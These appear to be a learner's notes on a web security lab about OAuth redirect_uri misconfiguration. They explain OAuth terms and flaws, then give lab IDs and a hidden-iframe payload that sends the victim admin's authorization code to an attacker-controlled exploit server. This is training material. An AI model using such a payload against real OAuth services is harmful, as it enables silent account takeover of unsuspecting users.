## Terminology

- **Client application** - The website or web application that wants to access the user's data.
- **Resource owner** - The user whose data the client application wants to access.
- **OAuth service provider** - The website or application that controls the user's data and access to it. They support OAuth by providing an API for interacting with both an authorization server and a resource server.

## How do OAuth authentication vulnerabilities arise?

OAuth authentication vulnerabilities arise partly because the OAuth specification is relatively vague and flexible by design. Although there are a handful of mandatory components required for the basic functionality of each grant type, the vast majority of the implementation is completely optional. This includes many configuration settings that are necessary for keeping users' data secure. In short, there's plenty of opportunity for bad practice to creep in.

One of the other key issues with OAuth is the general lack of built-in security features. The security relies almost entirely on developers using the right combination of configuration options and implementing their own additional security measures on top, such as robust input validation. As you've probably gathered, there's a lot to take in and this is quite easy to get wrong if you're inexperienced with OAuth.

Depending on the grant type, highly sensitive data is also sent via the browser, which presents various opportunities for an attacker to intercept it.

## Identifying OAuth authentication

Recognizing when an application is using OAuth authentication is relatively straightforward. If you see an option to log in using your account from a different website, this is a strong indication that OAuth is being used.

The most reliable way to identify OAuth authentication is to proxy your traffic through Burp and check the corresponding HTTP messages when you use this login option. Regardless of which OAuth grant type is being used, the first request of the flow will always be a request to the `/authorization` endpoint containing a number of query parameters that are used specifically for OAuth. In particular, keep an eye out for the `client_id`, `redirect_uri`, and `response_type` parameters. For example, an authorization request will usually look something like this:

`GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1 Host: oauth-authorization-server.com`

## Description

This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.

To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete the user `carlos`.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in with your own social media account using the following credentials: `wiener:peter`.

## Objectives

* Steal an authorization code from the admin
* Access their account with that code
* Delete the user **carlos**

## Preparation

#### My code `"AFvbc4ZEPyjB8y_aTC1dHBt9jVccEsFNTbNZvwVJn68"`
![[oauth_reedirect_uri.png]]
#### Client ID `"yomnvf6h4qblah4xzt3tb"`

![[Screenshot_20260329_084735.png]]

#### Lab ID `"0adb008f048fa16681a557a000d0009a"`

#### Oauth Server `"0aaf00620451a1e8813255e00275007f"`
This server ID is from the value in the Host header from the GET request 

#### Exploit ID `"0a9e0012039a203080bf02a2010f0049"`

## Payload Crafting

The goal is to make the admin's browser **silently** trigger an OAuth authorization request with the exploit server as the `redirect_uri`

- It loads a URL in the background invisibly
- The admin just sees a normal page but their browser is simultaneously making the OAuth request inside the hidden iframe
- Their browser sends the authorization code to the exploit server instead of the real callback URL

### Payload 
This payload is pasted into the HTTP body request in the exploit server 
`"<iframe src="https://oauth-0aaf00620451a1e8813255e00275007f.oauth-server.net/auth?client_id=yomnvf6h4qblah4xzt3tb&redirect_uri=https://exploit-YOUR-EXPLOIT-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>"`

0a9e0012039a203080bf02a2010f0049